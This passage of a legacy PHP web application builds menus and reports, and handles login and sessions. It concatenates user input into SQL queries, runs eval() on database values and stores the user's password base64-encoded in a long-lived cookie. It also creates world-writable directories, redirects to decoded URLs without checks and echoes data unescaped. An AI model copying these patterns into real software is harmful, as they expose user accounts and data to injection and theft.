	mysql_query("insert into app_bitacora (ano,mes,dia,hora,minuto,segundo,nick,nombre,tabla,accion,registro,ip,detalle)
			values ('" . date('Y') . "','" . date('m') . "','" . date('d') . "','" . date('G') . "','" . date('i') . "',
			'" . date('s') . "','".$_SESSION['Nick']."','".$_SESSION['Nombre']."','$T','M','$Id','" . $_SERVER['REMOTE_ADDR'] . "','Modifica:$C ingresa imagen')",$LINK);
	mysql_close($LINK);
	echo "<body ><script language='javascript'>parent.parent.document.getElementById('simg_$C').src='$File_destino';parent.parent.document.mod.$C.value='$File_destino';</script></body>";

}



////   FUNCIONES HOMOLOGADAS AGUILA 14 Y SUPERIOR  /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


class AQROpcionReporte
{
	var $Id=0; // Id del reporte
	var $Nombre=''; // Nombre del reporte
	var $Comando=''; // Comando del reporte
	function AQROpcionReporte($O)
	{
		$this->Id=$O->id;
		$this->Nombre=$O->nombre;
		$this->Comando="run_rep($this->Id);";
	}
	function pinta($Padre,$Tema)
	{
		if(u('disenador'))
		{
			echo "<tr onmouseover=\"muestra('i1$this->Id');muestra('i2$this->Id');muestra('i3$this->Id');\" onmouseout=\"oculta('i1$this->Id');oculta('i2$this->Id');oculta('i3$this->Id');\"><td style='padding-left:10px;'><a class='opcionmenu' onclick=\"".$this->Comando." \">$this->Id. $this->Nombre </a><br>
					<a class='info' id='i1$this->Id' style='visibility:hidden;' onclick=\"mod_rep('$this->Id');\"><img src='gifs/standar/dsn_config.png' border='0' height='12px' width='12px'><span>Modificar</span></a>&nbsp;
					<a class='info' id='i2$this->Id' style='visibility:hidden;' onclick=\"del_rep('$this->Id');\"><img src='gifs/standar/ocultar.png' border='0' height='12px' width='12px'><span>Borrar</span></a>&nbsp;
					<a class='info' id='i3$this->Id' style='visibility:hidden;' onclick=\"dupl_rep('$this->Id','$Tema','$this->Nombre');\"><img src='gifs/duplicar.png' border='0' height='12px' width='12px'><span>Duplicar</span></a>
					</td></tr>";
		}
		else
		{
			echo "<tr ><td onclick=\"".$this->Comando." \" class='opcionmenu' style='padding-left:10px;'>$this->Nombre</td></tr>";
		}
	}
	function app_pinta($Padre,$Tema)
	{
		echo "<tr ><td onclick=\"".$this->Comando." \" class='opcionmenu' style='padding-left:10px;'>$this->Nombre</td></tr>";
	}
}
class AQRMenuReporte
{
	var $Nombre=''; // Nombre de la Clase de Informe
	var $Opciones=array(); // arreglo de informes que pertenecen a la clase
	var $idPerfil=0; // id del perfil del usuario
	var $idtipo=''; // id del tipo de menu para poder crear submenus
	function AQRMenuReporte($Clase,$Perfil,$LINK)
	{
		$this->idPerfil=$Perfil;
		$this->Nombre=$Clase;
		$this->idtipo=uniqid('idR');
		$this->busca_opciones($LINK);
	}
	function busca_opciones($LINK)
	{
		if($this->idPerfil==1) {$Condicion2='';} else {$Condicion2=" and find_in_set('".$_SESSION['User']."',usuarios)";}
		$Contador=0;
		$Opciones_reporte=mysql_query("select * from aqr_reporte where clase='$this->Nombre' $Condicion2 ",$LINK);
		if(mysql_num_rows($Opciones_reporte))
		{
			while($Opcion_reporte=mysql_fetch_object($Opciones_reporte))
			{
				$this->Opciones[$Contador]=new AQROpcionReporte($Opcion_reporte);
				$Contador++;
			}
		}
	}
	function pinta($Padre)
	{
		$idt=$this->idtipo;
		if($_SESSION[USER]->Perfiles[$_SESSION[USER]->Perfil]->Disenador)
		{
			echo "<tr onmouseover=\"muestra('adr$idt');\" onmouseout=\"oculta('adr$idt');\"><td class='tipomenu'  style='padding-left:10px;'><img id='img_$idt' src='gifs/mas_opciones.png' onclick=\"aparece('$idt')\"><a class='tipomenu' onclick=\"aparece('$idt')\"> $this->Nombre </a>&nbsp;&nbsp;
						<a class='info' id='adr$idt' style='visibility:hidden;' onclick=\"adicionar_informe('$this->Nombre');\"><img src='gifs/standar/nuevo_registro.png' border='0' height='12px' width='12px'><span>Adicionar Informe en $this->Nombre</span></a><script language='javascript'>creahijo('$Padre','$idt');</script></td></tr>";
		}
		else
		{
			echo "<tr ><td class='tipomenu' onclick=\"aparece('$idt')\" style='padding-left:10px;'><img id='img_$idt' src='gifs/mas_opciones.png'> $this->Nombre<script language='javascript'>creahijo('$Padre','$idt');</script></td></tr>";
		}
		echo "<tr><td style='padding-left:15'><table cellpadding='0' id='$idt' style='visibility:hidden;position:absolute;' width='175px'> ";
		for($i=0;$i<count($this->Opciones);$i++)
		{
			$this->Opciones[$i]->pinta($idt,$this->Nombre);
		}
		echo "</table></td></tr>";
	}
	function app_pinta($Padre)
	{
		$idt=$this->idtipo;
		echo "<tr ><td class='tipomenu' onclick=\"aparece('$idt')\" style='padding-left:10px;'><img id='img_$idt' src='gifs/mas_opciones.png'> $this->Nombre<script language='javascript'>creahijo('$Padre','$idt');</script></td></tr>";
		echo "<tr><td style='padding-left:15'><table cellpadding='0' id='$idt' style='visibility:hidden;position:absolute;' width='100%'> ";
		for($i=0;$i<count($this->Opciones);$i++)
		{
			$this->Opciones[$i]->app_pinta($idt,$this->Nombre);
		}
		echo "</table></td></tr>";
	}
}
class AQROpcionmenu
{
	var $Nombre='';
	var $IdOpcion=0; // id dentro de usuario_tab
	var $Comando='';  // instruccion javascript que activa un modulo
	var $Comando_movil=''; // instruccion javascrip para uso en moviles
	var $Icono='';
	var $ImgIcono='';
	var $Acceso_rapido=0;
	var $idPerfil=0;
	var $Reportes=0;
	var $Id=''; // id unico para reportes
	var $MenuReportes=array();
	function AQROpcionmenu($O,$LINK)
	{
		$this->Nombre=ucwords(strtolower($O->descripcion));
		$this->IdOpcion=$O->id;
		$this->idPerfil=$O->usuario;
		$this->ImgIcono=$O->dicono_f;
		if($O->tabla=='centro_de_control') // CENTRO DE CONTROL
		{ if($O->destino=='_blank') $this->Comando="window.open('marcoindex.php?Acc=centro_de_control','_blank');";
			else $this->Comando="modal2('marcoindex.php?Acc=centro_de_control',0,0,$O->valto,$O->vancho,'$O->destino');";
			$this->Comando_movil="window.open('marcoindex.php?Acc=centro_de_control','destino');"; }
		elseif($O->tabla=='reportes' || $O->tabla=='reportes2.php') // REPORTES
		{
			$this->Comando=" modal2('$O->tabla',0,0,$O->valto,$O->vancho,'$O->destino');";
			$this->Comando_movil=" window.open('$O->tabla','$O->destino');";
			$this->Reportes=1;
			$this->Id=uniqid('MREP');
			//$O->icono=false;
			if($this->idPerfil==1) {$Condicion1='';} else {$Condicion1="where find_in_set('".$this->idPerfil."',usuarios)";}
			$Mis_reportes=mysql_query("select distinct clase from aqr_reporte $Condicion1 order by clase ",$LINK);
			if(mysql_num_rows($Mis_reportes))
			{
				$Contador=0;
				while($MiReporte=mysql_fetch_object($Mis_reportes))
				{
					$this->MenuReportes[$Contador] = new AQRMenuReporte($MiReporte->clase,$this->idPerfil,$LINK);
					$Contador++;
				}
			}
		}
		elseif(strpos($O->tabla, '.php') != 0 || strpos($O->tabla, '.htm') != 0 || strpos($O->tabla, '.html') != 0 || strpos(' '.$O->tabla, 'http://') != 0 || strpos(' '.$O->tabla, 'https://') != 0 || strpos(' '.$O->tabla, 'chrome://') != 0 || strpos(' '.$O->tabla, 'tel:') != 0 || strpos(' '.$O->tabla, 'callto:') != 0) // EXTERNOS O PHP
		{ $this->Comando="modal2('$O->tabla',0,0,$O->valto,$O->vancho,'$O->destino');";
			if(strpos(' '.$O->tabla, 'tel:') != 0 || strpos(' '.$O->tabla, 'callto:') != 0) $this->Comando_movil="$O->tabla"; else
			$this->Comando_movil="window.open('$O->tabla','$O->destino');"; }
		else // TABLA
		{
			if ($O->destino=='cabeza') { $this->Comando=" modal('marcoindex.php?Acc=abre_movimiento&Num_Tabla=$O->id',0,0,$O->valto,$O->vancho,'destino');";
															$this->Comando_movil=" window.open('marcoindex.php?Acc=abre_tabla&Num_Tabla=$O->id','_self');";}
			else { $this->Comando=" modal2('marcoindex.php?Acc=abre_tabla&Num_Tabla=$O->id',0,0,$O->valto,$O->vancho,'$O->destino');";
						$this->Comando_movil=" window.open('marcoindex.php?Acc=abre_tabla&Num_Tabla=$O->id','_self');"; }
		}
		if($O->icono) // ACCESOS RAPIDOS EN LA PARTE SUPERIOR
		{ $this->Icono=true; $_SESSION[USER]->Perfiles[$this->idPerfil]->Mr[]=array('id'=>$O->id, 'descripcion'=>$O->descripcion,'icono'=>$O->dicono_f,	'comando'=>$this->Comando); }
	}
	function pinta_opcion($Padre)
	{
		$Di=u('disenador');
		$imagen='';
		//contrast(250%) brightness(30%)
		if($this->ImgIcono) $imagen="<img src='$this->ImgIcono' border='0' height='14px' style='-webkit-filter:grayscale(100%);' > ";
		if($this->Reportes)
		{
			$idt=$this->Id; $Boton='';
			if($_SESSION[USER]->Perfiles[$_SESSION[USER]->Perfil]->Disenador)
			{
				echo "<tr onmouseover=\"muestra('adr0');\" onmouseout=\"oculta('adr0');\"><td class='tipomenu' style='padding-bottom:10;'><img id='img_$idt' src='gifs/mas_opciones.png' onclick=\"aparece('$idt')\"><a class='tipomenu' onclick=\"aparece('$idt')\">$imagen  Reportes</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
							<a class='info' id='adr0' style='visibility:hidden;' onclick='adicionar_informe();'><img src='gifs/standar/nuevo_registro.png' border='0' height='12px' width='12px'><span>Adicionar Informe Nuevo</span></a><script language='javascript'>creahijo('$Padre','$idt');</script></td></tr>";
				$Boton="";
			}
			else echo "<tr><td class='tipomenu' onclick=\"aparece('$idt')\" style='padding-bottom:10;'><img id='img_$idt' src='gifs/mas_opciones.png'>$imagen Reportes $Boton<script language='javascript'>creahijo('$Padre','$idt');</script></td></tr>";
			echo "<tr><td><table cellpadding='0' id='$idt' style='visibility:hidden;position:absolute;' width='195px'>";
			for($i=0;$i<count($this->MenuReportes);$i++)	 $this->MenuReportes[$i]->pinta($idt);
			echo "</table></td></tr>";
		}
		else
		{
			echo "<tr ".($Di?" onmouseover=\"muestra('admo_$this->IdOpcion');\" onmouseout=\"oculta('admo_$this->IdOpcion');\" ":"").
				"><td onclick=\"".$this->Comando." \" class='opcionmenu'>$imagen $this->Nombre</td>".
			($Di?"<td width='2%'><a id='admo_$this->IdOpcion' onclick=\"manipula_opcion($this->IdOpcion);\" style='visibility:hidden'>*</a></td>":"")
			."</tr>";
		}
	}
	function app_pinta_opcion($Padre)
	{
		$imagen='';
		//contrast(250%) brightness(30%)
		if($this->ImgIcono) $imagen="<img src='$this->ImgIcono' border='0' height='14px' style='-webkit-filter:grayscale(100%);' > ";
		if($this->Reportes)
		{
			$idt=$this->Id; $Boton='';
			echo "<tr><td class='tipomenu' onclick=\"aparece('$idt')\" style='padding-bottom:10;'><img id='img_$idt' src='gifs/mas_opciones.png'>$imagen Reportes $Boton<script language='javascript'>creahijo('$Padre','$idt');</script></td></tr>";
			echo "<tr><td><table cellpadding='0' id='$idt' style='visibility:hidden;position:absolute;' width='100%px'>";
			for($i=0;$i<count($this->MenuReportes);$i++)	 $this->MenuReportes[$i]->app_pinta($idt);
			echo "</table></td></tr>";
		}
		else
		{
			if(strpos(' '.$this->Comando_movil,'tel:') || strpos(' '.$this->Comando_movil,'callto:'))
			echo "<tr><td class='opcionmenu'><a href='".$this->Comando_movil."'>$imagen $this->Nombre</a></td></tr>";
			else echo "<tr><td onclick=\"".$this->Comando_movil."\" class='opcionmenu'>$imagen $this->Nombre</td></tr>";
		}
	}
	function app_pinta_acceso_directo()
	{
		if($this->Icono)
		{
			$imagen='';
			if($this->ImgIcono) $imagen="<img src='$this->ImgIcono' border='0' height='25px'> ";
			if(strpos(' '.$this->Comando_movil,'tel:') || strpos(' '.$this->Comando_movil,'callto:'))
			{
				echo "<tr><td class='acceso_rapido'><a href='".$this->Comando_movil." style='width:100%'> $imagen ".$this->Nombre."</a></td></tr>";
			}
			else
			{
				echo "<tr><td class='acceso_rapido' onclick=\"".$this->Comando_movil."\"> $imagen ".$this->Nombre."</td></tr>";
			}
		}
	}
 }
class AQRMenu
{
	var $Nombre='';
	var $idPerfil=0;
	var $Opciones=array();
	// var $Cambio_clave=0;
	var $Id=0;
	function AQRMenu($N,$idP,$LINK,$Cambio_clave=0)
	{
		$this->Nombre=ucwords(strtolower($N));
		$this->idPerfil=$idP;
		$this->Cambio_clave=$Cambio_clave;
		$this->Busca_opciones($LINK);
	}
	function Busca_opciones($LINK)
	{
		$Opcion=mysql_query("select * from usuario_tab where usuario=$this->idPerfil and tipo='$this->Nombre' order by descripcion",$LINK);
		$Contador=0;
		while($O=mysql_fetch_object($Opcion))
		{
			if($O->condi_aparece)
			{
				eval("\$Si_aparece=$O->condi_aparece;");
				if($Si_aparece)
				{
					$this->Opciones[$Contador]=new AQROpcionmenu($O,$LINK);
					$Contador++;
				}
			}
			else
			{
				$this->Opciones[$Contador]=new AQROpcionmenu($O,$LINK);
				$Contador++;
			}
		}
	}
	function pinta_menu($i)
	{
		$Di=u('disenador');
		$this->Id=$i;
		$idt='OM_'.$this->Id;
		echo "<tr id='M_$this->Id' ".($Di?" onmouseover=\"muestra('adm_$this->Id');\" onmouseout=\"oculta('adm_$this->Id');\" ":"").
				"><td id='td$idt' class='tipomenu' style='cursor:pointer;padding-bottom:10;' onclick=\"aparece('$idt');\"><img id='img_$idt' src='gifs/mas_opciones.png'> ".$this->Nombre."</td>".
				($Di?"<td width='2%'><a id='adm_$this->Id' onclick=\"adiciona_opcion('$this->Nombre');\" style='visibility:hidden'>+</a></td>":"")."</tr>
				<tr><td style='padding-left:20;'><table cellpadding='0' id='$idt' style='visibility:hidden;position:absolute;' width='190px'>";
		for($i=0;$i<count($this->Opciones);$i++)
		{
				$this->Opciones[$i]->pinta_opcion($idt);
		}
		echo "</table></td></tr>";
	}
	function app_pinta_menu($i)
	{
		$this->Id=$i;$idt='OM_'.$this->Id;
		echo "<tr id='M_$this->Id'>
				<td id='td$idt' class='tipomenu' style='padding-bottom:10;' onclick=\"aparece('$idt');\"><img id='img_$idt' src='gifs/mas_opciones.png'> ".$this->Nombre."</td></tr>
				<tr><td style='padding-left:20;'><table cellpadding='0' id='$idt' style='visibility:hidden;position:absolute;' width='100%'>";
		for($i=0;$i<count($this->Opciones);$i++)
		{
				$this->Opciones[$i]->app_pinta_opcion($idt);
		}
		echo "</table></td></tr>";
	}
	function app_pinta_accesos_directos($i)
	{
		for($i=0;$i<count($this->Opciones);$i++)
		{
			$this->Opciones[$i]->app_pinta_acceso_directo();
		}
	}
}
class AQRPerfil
{
	var $Id=0; // id del perfil
	var $Nombre=''; // nombre del perfil
	var $Nombre_Usuario=''; // Nombre del usuario en el perfil
	var $Tabla=''; // tabla de usuarios asociada al perfil
	var $Disenador=0; // si es diseñador se activan herramientas especiales
	var $Id_alterno=0; // Id alterno del usuario correspondiente a la tabla de usuarios del perfil
	var $Script_inicial=''; // Script inicial del perfil
	var $Cambia_clave=0; // si puede cambiar clave se activa el icono de cambio de contraseña
	var $Menu=array(); // arreglo de menus del perfil
	var $Mr=array(); // arreglo de iconos de acceso rapido.
	var $SoporteZopim=false; // Si esta activo, se muestra la ventana de chat de Zopim
	function Pinta_menu_lateral()
	{
		echo "<table cellpadding='0' width='100%'>";
		for($i=0;$i<count($this->Menu);$i++)
		{
			if($this->Menu[$i]->Nombre) $this->Menu[$i]->pinta_menu($i);
		}
		echo "</table>";
	}
	function app_pinta_menu()
	{
		echo "<table cellpadding='0' width='100%'>";
		for($i=0;$i<count($this->Menu);$i++)
		{
			if($this->Menu[$i]->Nombre) $this->Menu[$i]->app_pinta_menu($i);
		}
		echo "</table>";
	}
	function app_pinta_accesos_directos()
	{
		for($i=0;$i<count($this->Menu);$i++)
		{
			echo "<table width='100%' cellspacing='3' cellpadding='0'>";
			if($this->Menu[$i]->Nombre) $this->Menu[$i]->app_pinta_accesos_directos($i);
			echo "</table>";
		}
	}
}
class AQRSeguridad
{
	var $Perfil=0;
	var $Nick='';
	var $Nombre='';
	var $Perfiles=array();
	
	var $Cambia_clave=0;
	function pinta_perfiles()
	{
		foreach($this->Perfiles as $Este_perfil)
		{
			if($Este_perfil->Id != $this->Perfil)
			echo "<tr><td class='opcionmenu' colspan=2 onclick='toma_perfil($Este_perfil->Id);'><img src='gifs/standar/male.png' align='middle'> $Este_perfil->Nombre</td></tr>";
		}
	}
}
function u($dato='nombre')
{
	if($dato=='nombre') return $_SESSION[USER]->Perfiles[$_SESSION[USER]->Perfil]->Nombre_Usuario;
	if($dato=='perfil') return $_SESSION[USER]->Perfil;
	if($dato=='nick') return $_SESSION[USER]->Nick;
	if($dato=='nperfil') return $_SESSION[USER]->Perfiles[$_SESSION[USER]->Perfil]->Nombre;
	if($dato=='idusuario') return $_SESSION[USER]->Perfiles[$_SESSION[USER]->Perfil]->Id_alterno;
	if($dato=='disenador') return $_SESSION[USER]->Perfiles[$_SESSION[USER]->Perfil]->Disenador;
	if($dato=='tabla') return $_SESSION[USER]->Perfiles[$_SESSION[USER]->Perfil]->Tabla;
	if($dato=='ip') return $_SERVER['REMOTE_ADDR'];
	if($dato=='email') return $_SESSION[USER]->Email;
}
function localizacion_perfiles_usuario($funcion_ingreso,$IDuser,$clave,$PASA_IMAP,$siguientePHP,$CAMBIA_PERFIL)
{
	$ENCONTRADO=0;
	if($R=qo("select * from usuario where strcmp(idnombre,'$IDuser')=0"))
	{
		if(strcmp($R->clave,e($clave))==0 || $PASA_IMAP)
		{
			//session_start();session_cache_limiter('private');
			$_SESSION[USER]=new AQRSeguridad();
			$_SESSION[USER]->Perfil=$R->id;
			$_SESSION[USER]->Nick=$IDuser;
			$_SESSION[USER]->Nombre=$R->nombre;
			$_SESSION[USER]->Email=$R->email;
			$_SESSION[USER]->Perfiles[$R->id]=new AQRPerfil();
			$_SESSION[USER]->Perfiles[$R->id]->Id=$R->id;
			$_SESSION[USER]->Perfiles[$R->id]->Nombre=$R->nombre;
			$_SESSION[USER]->Perfiles[$R->id]->Nombre_Usuario=$R->nombre;
			$_SESSION[USER]->Perfiles[$R->id]->Disenador=$R->design;
			$_SESSION[USER]->Perfiles[$R->id]->Tabla='usuario';
			$_SESSION[USER]->Perfiles[$R->id]->Id_alterno=$R->id;
			$_SESSION[USER]->Perfiles[$R->id]->Cambia_clave=$R->cambia_clave;
			$_SESSION[USER]->Perfiles[$R->id]->Script_inicial=$R->script_entrada;
			$_SESSION[USER]->Perfiles[$R->id]->SoporteZopim=$R->opcion_soporte;
			$ENCONTRADO++;
		}
		else
		{
			session_start();session_unset();session_destroy();
			if($siguientePHP)
			{
				setcookie(COOKIE_APP_DATA1,false,time()-10);
				setcookie(COOKIE_APP_DATA2,false,time()-10);
				echo "<html><body><script language='javascript'>alert('Ingreso Fallido.!! ....'); window.open('".base64_decode($siguientePHP)."','_parent');</script></body></html>"; die();
			}
			html();
			echo "<body oncontextmenu='return false' ><script language='javascript'>window.open('marcoindex.php?Acc=$funcion_ingreso&SESION_PUBLICA=1&error_previo=Usuario o clave Invalida.','_self');</script>";
			die('</body></html>');
		}
	}
	if($S1=q("select * from usuario where LENGTH(alt_tabla)>0 and LENGTH(alt_id)>0 and LENGTH(alt_pass)>0 and LENGTH(alt_nombre)>0 and control_acceso_app=1 order by id"))
	{
		while ($R1=mysql_fetch_object($S1))
		{
			if($R2=qo("select id,$R1->alt_nombre as nombre, $R1->alt_pass as Clave, ".($R1->alt_email?"$R1->alt_email as email ":" email ")." from $R1->alt_tabla where strcmp($R1->alt_id,'$IDuser')=0"))
			{
				$continua=true;
				if(haycampo('activo',$R1->alt_tabla))
				{
					if(!qo1("select activo from $R1->alt_tabla where id=$R2->id"))
					{
						$continua=false;
						echo "<body><script language='javascript'>alert('Acceso al perfil $R1->nombre Deshabilitado.');</script></body>";
					}
				}
				if($continua)
				IF(strcmp($R2->Clave,e($clave))==0 || $CAMBIA_PERFIL)
				{
					$idPerfil=$R1->id;
					if(!isset($_SESSION[USER]))
					{
						$_SESSION[USER]=new AQRSeguridad();
						$_SESSION[USER]->Perfil=$idPerfil;
						$_SESSION[USER]->Nick=$IDuser;
						$_SESSION[USER]->Nombre=$R2->nombre;
						$_SESSION[USER]->Email=$R2->email;
					}
					$_SESSION[USER]->Perfiles[$idPerfil]=new AQRPerfil();
					$_SESSION[USER]->Perfiles[$idPerfil]->Id=$R1->id;
					$_SESSION[USER]->Perfiles[$idPerfil]->Nombre=$R1->nombre;
					$_SESSION[USER]->Perfiles[$idPerfil]->Nombre_Usuario=$R2->nombre;
					$_SESSION[USER]->Perfiles[$idPerfil]->Disenador=$R1->design;
					$_SESSION[USER]->Perfiles[$idPerfil]->Tabla=$R1->alt_tabla;
					$_SESSION[USER]->Perfiles[$idPerfil]->Id_alterno=$R2->id;
					$_SESSION[USER]->Perfiles[$idPerfil]->Cambia_clave=$R1->cambia_clave;
					$_SESSION[USER]->Perfiles[$idPerfil]->Script_inicial=$R1->script_entrada;
					$_SESSION[USER]->Perfiles[$idPerfil]->SoporteZopim=$R1->opcion_soporte;
					$ENCONTRADO++;
				}
			}
		}
	}
	return $ENCONTRADO;
}
function ingreso_sistema_SM() // funcion que presenta la ventana de ingreso de usuario y clave
{
	session_start();
	session_unset();session_destroy();
	global $siguientePHP,$registroPHP,$error_previo;
	$Charset='ISO-8859-1';
	echo "<HTML>
	<meta content='width=device-width, initial-scale=1.0' name='viewport'/>
	<meta content='IE=9; IE=8; IE=7; IE=EDGE; chrome=1' http-equiv='X-UA-Compatible'/>
	<meta content='text/html; http-equiv='Content-Type'/ charset=$Charset'>
	<link href='inc/css/ingreso_sistema.css' rel='stylesheet'/>
	<script language='javascript' src='inc/js/aqrenc.js'></script>
	<body leftmargin='0' topmargin='0' bottommargin='0' rightmargin='0'>
		<form action='marcoindex.php' method='post' target='_self' name='forma' id='forma'>
			<input type='hidden' name='iDU'><input type='hidden' name='cLU'><input type='hidden' name='Acc' value='valida_entrada'>
			<input type='hidden' name='SESION_PUBLICA' value='1'>
			<input type='hidden' name='siguientePHP' value='$siguientePHP'>
			<input type='hidden' name='registroPHP' value='$registroPHP'>
			<input type='hidden' name='funcion_ingreso' id='funcion_ingreso' value='ingreso_sistema_SM'>
		</form>
		<form  name='entrada' id='entrada'>
			<input type='text' style='margin-bottom: -1px;border-top-left-radius: 10px;border-top-right-radius: 10px;' placeholder='Usuario' name='Usuario' id='Usuario' required autofocus>
			<br/>
			<input type='password' style='margin-bottom: -1px;border-bottom-left-radius: 5px;border-bottom-right-radius: 5px;'  placeholder='Clave' name='Clave' id='Clave' required> ";
	if(RESETEAR_CLAVE) echo "<a onclick=\"window.open('marcoindex.php?Acc=resetear_clave&SESION_PUBLICA=1&sm=1','_self');\" title='RESTABLECER CLAVE' style='cursor:pointer;'><img src='gifs/standar14/reset_clave2.png' height='20' valign='top'></a>";
	echo "<br/>
			<button type='button'  class='button small'
			onclick=\"
			document.forma.iDU.value=document.entrada.Usuario.value;
			document.forma.cLU.value=document.entrada.Clave.value;
			document.entrada.Usuario.value='**********';
			document.entrada.Clave.value='**********';
			document.forma.submit();
			\"> ENTRAR </button>
		</form>
		<span style='color:red;background-color:ffffff;'>$error_previo</span>
	</body></html>";
}
function valida_entrada()
{
	global $iDU,$cLU,$RE_SESION,$siguientePHP,$registroPHP,$funcion_ingreso;
	if($RE_SESION){
		$IDuser=trim($_GET['iDU']);
		$_GET['iDU']='';
		$clave=trim($_GET['cLU']);
		$_GET['cLU']='';
	}else{ 
	$IDuser=trim($_POST['iDU']);
	$_POST['iDU']='';
	$clave=trim($_POST['cLU']);
	$_POST['cLU']='';
	}
	
	
	
	if(!$IDuser)
	{
		   
		session_start();	session_unset();session_destroy();
		if($siguientePHP)
		{
			setcookie(COOKIE_APP_DATA1,false,time()-10);
			setcookie(COOKIE_APP_DATA2,false,time()-10);
			echo "<html><body><script language='javascript'>alert('Ingreso Fallido.!! .'); window.open('".base64_decode($siguientePHP)."','_parent');</script></body></html>"; die();
		}
		html();
		echo "<body oncontextmenu='return false' ><script language='javascript'>window.open('marcoindex.php?Acc=$funcion_ingreso&SESION_PUBLICA=1&error_previo=Usuario Invalido','_self');</script>";
		die('</body></html>');
	}
	session_start();session_cache_limiter('private');
	$ENCONTRADO=localizacion_perfiles_usuario($funcion_ingreso,$IDuser,$clave,false,$siguientePHP,
	(isset($CAMBIA_PERFIL)?$CAMBIA_PERFIL:false));
	if($ENCONTRADO)
	{
		
		$_SESSION['Nick']=u('nick');
		$_SESSION['User']=u('perfil');
		$_SESSION['Disenador']=0;
		$_SESSION['Id_alterno']=u('idusuario');
		$_SESSION['Nombre']=u('nombre');
		$_SESSION['Tabla_usuario']=u('tabla');
		$_SESSION['Email']=u('email');
		$_SESSION['Ngrupo']=u('nperfil');
		if(defined('COOKIE_APP_DATA1') && defined('COOKIE_APP_DATA2'))
		{
			@setcookie(COOKIE_APP_DATA1,base64_encode($IDuser),time()+(90*24*60*60));
			@setcookie(COOKIE_APP_DATA2,base64_encode($clave),time()+(90*24*60*60));
		}
		graba_bitacora(u('tabla'),'1',u('idusuario'),'Ingreso a la plataforma');
	}
	else
	{
		setcookie(COOKIE_APP_DATA1,false,time()-10);
		setcookie(COOKIE_APP_DATA2,false,time()-10);
		echo "<html><body><script language='javascript'>alert('Ingreso Fallido.!! .'); window.open('".base64_decode($siguientePHP)."','_parent');</script></body></html>"; die();
	}
	if($RE_SESION)
		echo "<html><body><script language='javascript'>parent.opener.location.reload();parent.cerrar();</script></body></html>";
	elseif($siguientePHP)
		echo "<html><body><script language='javascript'>window.open('".base64_decode($siguientePHP)."','_parent');</script></body></html>";
	else
		echo "<html><body><script language='javascript'>window.open('marcoindex.php','_top');</script></body></html>";
}
function directorio_imagen($directorio='',$Id=0)
{
	if($directorio && $Id)
	{
		if(!is_dir($directorio)) { mkdir($directorio); chmod($directorio, 0777); }
		$Subdirectorio=substr(str_pad($Id,6,'0',STR_PAD_LEFT),0,3);
		if(!is_dir($directorio.'/'.$Subdirectorio)) { mkdir($directorio.'/'.$Subdirectorio); chmod($directorio.'/'.$Subdirectorio, 0777);}
		if(!is_dir($directorio.'/'.$Subdirectorio.'/'.$Id)) { mkdir($directorio.'/'.$Subdirectorio.'/'.$Id); chmod($directorio.'/'.$Subdirectorio.'/'.$Id, 0777);}
		$ruta=$directorio.'/'.$Subdirectorio.'/'.$Id.'/';
	}
	else $ruta='';
	return $ruta;
}
function tipos_menu()
{
	html();
	echo "
	<script language='javascript'>
		function pasar(dato)
		{
			parent.document.mod.tipo.value=dato;
		}
	</script>
	<style type='text/css'>
	<!--
		body {margin-top:0;margin-bottom:0;margin-left:0;margin-right:0;}
	-->
	</style>
	<body>".menu1("tm","select distinct tipo,tipo as nombre from usuario_tab where usuario=1 order by tipo",0,1,"width:100","onchange='pasar(this.value);' ");

	echo "</body>";
}
function muestra_imagen()
{
	include('../Control/operativo/inc/gpos.php');
	html();
	echo "<body><img src='$i' border='0' style='max-width:100%;max-height:100%;'></body></html>";
}
function capturar_firma()
{
	include('inc/gpos.php');
	echo "<!DOCTYPE html>
		<html>
			<head>
				<meta charset='utf-8'>
				<title>CAPTURA DE FIRMA</title>
				<meta name='description' content='Captura de firma digital Hmtl5 y canvas basado en una firma dibujada con método de interpolación'>
				<meta name='viewport' content='width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no'>
				<meta name='apple-mobile-web-app-capable' content='yes'>
				<meta name='apple-mobile-web-app-status-bar-style' content='black'>
				<link rel='stylesheet' href='inc/css/captura_firma.css'>
				<script language='javascript'>
					function guardar()
					{
						var canvas=document.getElementById('firma');
						var cadena=canvas.toDataURL('image/png',1.0);
						document.forma.img.value=cadena.split('base64,')[1];
						document.forma.submit();
					}
					";
	if($_SESSION['css_movil'])
		echo "	function regresar(){window.open('".COOKIE_APP_PHP.($retorno?"?Acc=".str_replace('~','&',$retorno):"")."','_self');}";
	else
		echo "	function regresar(){window.open('$app','_self');}";
	echo "
					function recargar(){window.history.back();}
				</script>
			</head>
			<body onselectstart='return false;'>
				<div id='signature-pad' class='m-signature-pad'>
					<div class='m-signature-pad--body'>
						<canvas width='658' height='318' id='firma'></canvas>
					</div>
					<div class='m-signature-pad--footer'>
						<div class='description'>Firme arriba</div>
						<button class='button clear' data-action='clear'>Limpiar (en caso de girar el movil)</button>
						<button class='button save' data-action='save' onclick='guardar();'>Guardar Firma</button>
					</div>
				</div>
				<script src='inc/js/signature_pad.js'></script>
				<script src='inc/js/app.js'></script>
				<form action='$app' target='Oculto_capturar_firma' method='POST' name='forma' id='forma'>
					<input type='hidden' name='img' value=''>
					<input type='hidden' name='Acc' id='Acc' value='$acc'>
					<input type='hidden' name='id' id='id' value='$id'>
				</form>
			</body>
			<iframe name='Oculto_capturar_firma' id='Oculto_capturar_firmar' style='display:none' width='1' height='1'></iframe>
		</html>";
}
function reenviourl()
{
	include('inc/gpos.php');
	header("location:".base64_decode($sitio));
}




?>